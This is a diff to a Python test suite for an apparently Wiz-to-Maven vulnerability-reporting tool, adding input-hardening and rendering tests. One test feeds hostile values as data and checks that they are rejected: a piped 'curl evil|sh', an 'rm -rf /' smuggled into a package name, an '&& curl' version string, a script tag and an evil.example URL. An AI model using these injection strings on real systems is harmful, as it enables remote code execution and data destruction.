@@ -146,14 +146,14 @@ class FindingsTests(unittest.TestCase):
         self.assertEqual(list(res.unmatched), ["lodash"])
 
     def test_stale_finding_dropped(self):
-        raw = [{"cve": "CVE-1", "package": "junit:junit", "fixed_versions": "4.11", "severity": "HIGH"}]
+        raw = [{"cve": "CVE-2020-0001", "package": "junit:junit", "fixed_versions": "4.11", "severity": "HIGH"}]
         res = fnd.evaluate(raw, self.inv)
         self.assertEqual(res.upgrades, [])
-        self.assertEqual(res.already_fixed, {"junit:junit": ["CVE-1"]})
+        self.assertEqual(res.already_fixed, {"junit:junit": ["CVE-2020-0001"]})
 
     def test_duplicate_cve_merged(self):
-        raw = [{"cve": "CVE-9", "package": "junit:junit", "fixed_versions": "4.13.1", "severity": "LOW"},
-               {"cve": "CVE-9", "package": "junit", "fixed_versions": "4.13.2", "severity": "HIGH", "cisa_kev": True}]
+        raw = [{"cve": "CVE-2020-0009", "package": "junit:junit", "fixed_versions": "4.13.1", "severity": "LOW"},
+               {"cve": "CVE-2020-0009", "package": "junit", "fixed_versions": "4.13.2", "severity": "HIGH", "cisa_kev": True}]
         u = fnd.evaluate(raw, self.inv).upgrades[0]
         self.assertEqual((len(u.cves), u.max_severity, u.kev, u.target), (1, "HIGH", True, "4.13.1"))
 
@@ -200,6 +200,68 @@ class RenderPublishTests(unittest.TestCase):
         self.assertIn("`new:dep`", p.comment)
         self.assertEqual(publish.plan(existing, fp, {}, True).action, "close")
         self.assertEqual(publish.plan(existing, fp, {}, False).action, "noop")
+
+
+class HardeningTests(unittest.TestCase):
+    def test_validation_rejects_injection(self):
+        inv = sample_inventory()
+        raw = [
+            {"cve": "CVE-2021-44228\n- run `curl evil|sh`", "package": "org.apache.logging.log4j:log4j-core", "severity": "HIGH"},
+            {"cve": "CVE-2021-44228", "package": "log4j-core`; rm -rf /", "severity": "HIGH"},
+            {"cve": "CVE-2021-44228", "package": "org.apache.logging.log4j:log4j-core",
+             "fixed_versions": ["2.17.1", "2.17.1 && curl x", "<script>"], "severity": "critical",
+             "url": "https://evil.example/x", "cisa_kev": "true"},
+        ]
+        res = fnd.evaluate(raw, inv)
+        self.assertEqual(res.rejected, 2)
+        u = res.upgrades[0]
+        self.assertEqual((u.target, u.max_severity, u.kev, u.cves[0].url), ("2.17.1", "CRITICAL", True, None))
+        body = render.body(res, "acme/x", None, "t", None)
+        self.assertNotIn("curl", body)
+        self.assertNotIn("evil", body)
+
+    def test_ghsa_and_wiz_url_accepted(self):
+        f = fnd.normalise({"cve": "GHSA-jfh8-c2jp-5v3q", "package": "a:b", "url": "https://app.wiz.io/explorer/x?y=1"})
+        self.assertIsNotNone(f)
+        self.assertEqual(f.url, "https://app.wiz.io/explorer/x?y=1")
+
+    def test_inventory_json_roundtrip(self):
+        from wizconnector.maventree import Inventory
+        inv = sample_inventory()
+        again = Inventory.from_json(json.loads(json.dumps(inv.to_json())))
+        raw = json.loads((FIX / "wiz-findings.json").read_text())["findings"]
+        a, b = fnd.evaluate(raw, inv), fnd.evaluate(raw, again)
+        self.assertEqual(render.fingerprint(a), render.fingerprint(b))
+        self.assertEqual(render.body(a, "r", None, "t", None), render.body(b, "r", None, "t", None))
+
+    def test_fix_commands_bump_shared_property_once(self):
+        from wizconnector.findings import Upgrade
+        decl = {"kind": "property", "file": "pom.xml", "property": "jackson.version"}
+        ups = [Upgrade(ga="com.fasterxml.jackson.core:jackson-databind", current="2.9.8", target="2.12.7.1", declarations=[decl]),
+               Upgrade(ga="com.fasterxml.jackson.core:jackson-core", current="2.9.8", target="2.13.0", declarations=[decl])]
+        cmds = [c for c in render.fix_commands(ups) if not c.startswith("#")]
+        self.assertEqual(len(cmds), 1)
+        self.assertIn("-Dproperty=jackson.version -DnewVersion=2.13.0", cmds[0])
+
+    def test_replace_mode(self):
+        raw = json.loads((FIX / "wiz-findings.json").read_text())["findings"]
+        res = fnd.evaluate(raw, sample_inventory())
+        b = render.body(res, "acme/x", None, "t", None)
+        ups = {u.ga: u.target for u in res.upgrades}
+        p = publish.plan([{"number": 4, "body": b}], "changed", ups, True, on_change="replace")
+        self.assertEqual((p.action, p.number), ("replace", 4))
+
+    def test_agent_output_fallback_and_error(self):
+        from wizconnector import cli
+        with tempfile.TemporaryDirectory() as td:
+            ao = Path(td) / "agent_output.json"
+            ao.write_text(json.dumps({"items": [{"type": "publish_wiz_report",
+                                                 "findings_json": json.dumps({"findings": [{"cve": "CVE-2020-15250", "package": "junit:junit", "fixed_versions": ["4.13.1"], "severity": "MEDIUM"}]})}]}))
+            self.assertEqual(len(cli._load_findings(str(Path(td) / "missing.json"), str(ao))), 1)
+            err = Path(td) / "f.json"
+            err.write_text(json.dumps({"error": "401 Invalid client credentials", "findings": []}))
+            with self.assertRaises(SystemExit):
+                cli._load_findings(str(err), None)
 
 
 if __name__ == "__main__":
